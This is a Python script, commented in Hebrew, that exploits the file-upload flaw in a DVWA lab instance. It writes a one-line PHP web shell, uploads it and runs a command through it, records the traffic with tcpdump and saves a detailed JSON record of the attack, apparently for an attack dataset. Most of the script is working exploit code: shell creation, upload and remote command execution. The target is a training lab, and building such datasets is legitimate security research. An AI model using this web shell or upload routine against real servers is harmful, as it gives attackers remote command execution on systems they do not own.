import os
import requests
import time
import json
import socket
import datetime
import subprocess
from scapy.all import rdpcap, IP, TCP
from bs4 import BeautifulSoup

# ====== הגדרות בסיס ======
ATTACK_ID = "EXP-dvwa-upload-0001"
VICTIM_IP = "192.168.56.101"
INTERFACE = "vboxnet0"
PCAP_FILE = f"{ATTACK_ID}.pcap"
JSON_FILE = f"{ATTACK_ID}.json"
UPLOAD_URL = f"http://{VICTIM_IP}/dvwa/vulnerabilities/upload/"
SHELL_NAME = "shell.php"
SHELL_PATH = f"/tmp/{SHELL_NAME}"
CMD_TO_RUN = "id"

# ====== הכנות ======
def get_timestamp():
    return datetime.datetime.utcnow().isoformat() + "Z"

def create_shell_file():
    with open(SHELL_PATH, "w") as f:
        f.write("<?php system($_GET['cmd']); ?>")

# ====== הקלטת pcap ======
def start_pcap():
    return subprocess.Popen([
        "tcpdump", "-i", INTERFACE, "-w", PCAP_FILE,
        f"host {VICTIM_IP}"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def stop_pcap(proc):
    proc.terminate()
    proc.wait()

# ====== התחברות ל-DVWA ======
def get_csrf_and_cookies(session, url):
    r = session.get(url)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "user_token"}) or soup.find("input", {"name": "token"})
    return token["value"] if token else None, r.cookies

def upload_shell(session, cookies, token):
    files = {'uploaded': (SHELL_NAME, open(SHELL_PATH, 'rb'), 'application/x-php')}
    data = {
        "Upload": "Upload",
    }
    if token:
        data["user_token"] = token
    r = session.post(UPLOAD_URL, files=files, data=data, cookies=cookies)
    return r.status_code == 200

def execute_remote_cmd(session, cmd):
    url = f"http://{VICTIM_IP}/dvwa/hackable/uploads/{SHELL_NAME}?cmd={cmd}"
    r = session.get(url)
    return r.text.strip()

# ====== ניתוח pcap ======
def analyze_pcap(path):
    packets = rdpcap(path)
    connections = []
    ports = set()
    protocols = set()
    first_ts, last_ts = None, None

    for i, pkt in enumerate(packets):
        if IP in pkt and TCP in pkt:
            src, dst = pkt[IP].src, pkt[IP].dst
            sport, dport = pkt[TCP].sport, pkt[TCP].dport
            payload = bytes(pkt[TCP].payload)
            ports.update([sport, dport])
            protocols.update(["IP", "TCP"])
            if not first_ts:
                first_ts = pkt.time
            last_ts = pkt.time
            connections.append({
                "src": src,
                "dst": dst,
                "sport": sport,
                "dport": dport,
                "payload_preview": payload[:32].hex(),
                "payload_size": len(payload)
            })

    return {
        "total_packets": len(packets),
        "protocols_detected": list(protocols),
        "unique_ports": list(ports),
        "connections": connections,
        "timestamps": {
            "first_packet": str(datetime.datetime.fromtimestamp(first_ts)) if first_ts else None,
            "last_packet": str(datetime.datetime.fromtimestamp(last_ts)) if last_ts else None
        },
        "suspicious_patterns": ["file upload", "remote code execution"]
    }

# ====== יצירת JSON ======
def build_json(cmd_output, pcap_data):
    return {
        "attack_id": ATTACK_ID,
        "timestamp": get_timestamp(),
        "target": {
            "ip": VICTIM_IP,
            "os": "Linux (Metasploitable2)",
            "vendor": "DVWA",
            "services": [
                {"port": 80, "service": "http", "version": "Apache"}
            ],
            "cpe_list": [],
            "known_vulnerabilities": ["DVWA File Upload RCE"],
            "system_context_notes": "File upload with PHP execution"
        },
        "exploit_metadata": {
            "exploit_id": "dvwa-upload-rce",
            "exploit_title": "DVWA File Upload Remote Code Execution",
            "cve_id": None,
            "exploit_language": "php",
            "exploit_type": "File Upload → Remote Code Execution",
            "source": "manual + script",
            "exploit_path": "/dvwa/hackable/uploads/shell.php"
        },
        "exploit_code_raw": "<?php system($_GET['cmd']); ?>",
        "exploit_trigger_description": "PHP file uploaded via DVWA upload page, then executed via URL",
        "code_static_features": {
            "functions": ["system"],
            "syscalls_used": [],
            "payload_type": "php_command_execution",
            "encoding_methods": [],
            "obfuscation_level": "none",
            "external_dependencies": [],
            "exploit_technique": "Upload shell + execute via GET"
        },
        "runtime_behavior": {
            "files_created": ["/var/www/html/dvwa/hackable/uploads/shell.php"],
            "connections_made": [f"{VICTIM_IP}:80"],
            "processes_spawned": ["/bin/bash", "system()"],
            "syscalls_trace": [],
            "anti_detection_evasion": ["none"],
            "network_trace_file": PCAP_FILE,
            "cpu_usage_peak": "unknown",
            "memory_usage": "unknown"
        },
        "attack_impact": {
            "success": True,
            "access_level": "www-data",
            "shell_opened": False,
            "persistence_achieved": False,
            "data_exfiltrated": [],
            "log_files_modified": [],
            "detected_by_defenses": False,
            "quality_score": 0.85
        },
        "pcap_analysis": pcap_data,
        "exploit_analysis_detailed": [
            {
                "line": "<?php system($_GET['cmd']); ?>",
                "explanation": "קוד PHP שמריץ פקודה שמתקבלת כפרמטר",
                "purpose": "ביצוע קוד בצד השרת",
                "impact": "הרצת פקודות באפליקציה",
                "critical": True,
                "used_in_execution": True,
                "modified_target_state": True,
                "line_effectiveness_score": 1.0
            }
        ]
    }

# ====== MAIN ======
print("[*] Starting DVWA upload exploit...")
create_shell_file()
tcpdump_proc = start_pcap()
time.sleep(1)

with requests.Session() as session:
    token, cookies = get_csrf_and_cookies(session, UPLOAD_URL)
    if not upload_shell(session, cookies, token):
        stop_pcap(tcpdump_proc)
        raise Exception("[-] Upload failed.")
    time.sleep(1)
    output = execute_remote_cmd(session, CMD_TO_RUN)
    print("[+] Command Output:", output)

stop_pcap(tcpdump_proc)
pcap_data = analyze_pcap(PCAP_FILE)
json_data = build_json(output, pcap_data)

with open(JSON_FILE, "w") as f:
    json.dump(json_data, f, indent=2)

print(f"[+] Attack JSON saved to {JSON_FILE}")
